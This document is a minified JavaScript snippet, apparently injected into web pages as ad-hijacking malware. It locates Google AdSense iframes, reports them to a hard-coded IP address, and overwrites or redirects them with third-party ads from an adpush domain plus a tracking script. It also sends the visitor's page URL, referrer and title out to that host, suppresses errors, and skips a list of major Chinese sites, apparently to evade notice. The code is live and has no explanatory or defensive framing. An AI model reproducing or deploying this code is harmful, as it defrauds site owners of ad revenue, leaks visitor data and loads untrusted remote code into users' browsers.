var gcproND=gcproND||{},gcproNC=gcproNC||{};~function(s,e,N,O){s.onerror=function(){return!0};var y='<script src="'+(function(c,b){for(var d,j,g,k=/pagead2\.googlesyndication\.com\/pagead\/(?:js\/adsbygoogle|show_ads)/,f=c.length,h;f--;){g=c[f];h=g.src;if(k.test(h)){if(g.async){j=1}b=h;break}}d=b.replace('/pagead/','//pagead/')+'?'+(+new Date);j&&~function(a){a.src=d;g.parentNode.insertBefore(a,g);d=''}(e.createElement('script'));return d})(e.getElementsByTagName('script'),'http://pagead2.googlesyndication.com/pagead/show_ads.js')+'"><\/script>',z=e.body||e.getElementsByTagName('head')[0],P=!!s.VBArray,i='done',p='gcpro',A='BODY',R=function(){return(function(a){for(var c=0,b=[],d,j=a.length;c<j;c++){d=a[c];!d.getAttribute(i)&&/^aswift_/.test(d.id)&&b.push(d)}return b})(e.getElementsByTagName('iframe'))},B=P?function(){var c;return function(a){if(a&&a.tagName.toUpperCase()!=A){c=c||e.createElement('div');c.appendChild(a);c.innerHTML=''}}}():function(a){a&&a.parentNode&&a.tagName.toUpperCase()!=A&&a.parentNode.removeChild(a)},C=function(c,b,d,j){var g=j||'jsoncallback',k=g+(+new Date),f=e.createElement('script'),h=[];b=b||{};b[g]=k;s[k]=function(a){d(a)};for(var n in b){b.hasOwnProperty(n)&&h.push(n+'='+b[n])}c+=(/\?/.test(c)?'&':'?')+h.join('&');f.onload=f.onreadystatechange=function(){if(/m|ded/i.test(this.readyState||'m')){f.onload=f.onreadystatechange=null;f=null;s[k]=null;B(f)}};f.src=c;f.async=!0;z.insertBefore(f,z.firstChild)},t,D=e.URL,F=e.location.hostname,G=(D.match(/^https?:\/\/([^\/?#&:]+)/i)||[])[1]||F,H=(function(a){return a?a.substr(0,a.length-1):G})(((G+'/').match(/[\w-]+\.(?:com|net|org|gov|ed?u|mil|c[chnomz]|t[mklv]|m[ex]|biz|name|info|mobi|int?|pro|museum|coop|aero|xxx|idv|la|[ar]u|uk|[ai]t|so|us|[eb]e|am)(?:\.(?:c[no]|hk|jp|tw|kr|mo|de))*\//i)||[])[0]),u=[D,H,e.referrer,e.title];y&&e.write(y);O.test(F)||~function(){t&&clearTimeout(t);t=null;for(var l,q,v,I=R(),w=0,S=I.length;w<S;w++){l=I[w];q=1*l.width+'-'+1*l.height;if(gcproNC[q]||gcproND[q]){l.setAttribute(i,i);continue}gcproNC[q]=1;if(l.getAttribute(p)){continue}v=p+(+new Date)+'|'+(l.id||'');l.setAttribute(p,v);C(N,{wh:q,t:v,tt:'gg'},function(T){var r=T||{},J=r.wh,o=r.u||'',x=r.t;if(J){gcproND[J]=1}x&&~function(K){for(var m,L=K.length;L--;){m=K[L];if(x==m.getAttribute(p)){if(~o.indexOf('/zz.adpush.cn/')){C(o,{rd:escape(((u[4]=r.w),(u[5]=r.h),u).join('\u03B6')),tm:x},function(j){var g=j||{},k=g.h,f=g.g,h=g.s,n=g.t,M=(n||'').split('|');2==M.length&&k&&~function(a){var c='<html><head><script defer src="'+(/^\d+$/.test(h)?'http://w.cnzz.com/c.php?id=':'')+h+'"><\/script></head><body style="margin:0px;overflow:hidden"><a target="_blank" href="'+k+'" style="outline:none;hide-focus:expression(this.hideFocus=true)"><img style="bottom:0px;right:0px" border="0px" width="100%" height="100%" src="'+f+'"/></a></body></html>';if(a){var b;try{b=a.contentWindow.document;b.open();b.write(c);b.close()}catch(E){if(a.parentNode){var d=a.cloneNode(false);d.setAttribute(i,i);d.src='';a.parentNode.insertBefore(d,a);B(a);try{b=d.contentWindow.document;b.open();b.write(c);b.close()}catch(Q){}d.onload=null}}a.setAttribute(i,i)}}(e.getElementById(M[1])||(function(a){for(var c,b=a.length;b--;){c=a[b];if(c.getAttribute(p)==n){return c}}return null})(e.getElementsByTagName('iframe')))},'callback')}else{m.setAttribute(i,i);o&&!~o.indexOf(H)&&~function(){m.removeAttribute('onload');m.onload=null;try{m.contentWindow.location.replace(o)}catch(X){m.src=o}}()}break}}}(e.getElementsByTagName('iframe'))})}t=setTimeout(arguments.callee,300)}()}(self,document,'http://104.193.93.58/',/qq\.com|ifeng\.com|sina\.com\.cn|china\.com|fun\.tv|weather\.com\.cn|taobao\.com|baidu\.com|so\.com|360\.cn|sohu\.com|jrpengze\.com|mianbao\.com|yykge\.com|6vhao\.com|5281520\.com|158junshi\.com|tiexin\.org|yyets\.com|jijihd\.com|hdwai\.com|fkkxs\.com|fobtx\.com|10pan\.cc|qqzuqiu\.com|txt99\.cc|shyhgm\.com|2cl\.cc|shanxijiaxiao\.com|xuantongtv\.com|zhainanba\.net|nanrenshu\.com|zydh123\.com|caogong\.org|brothersoft\.com/);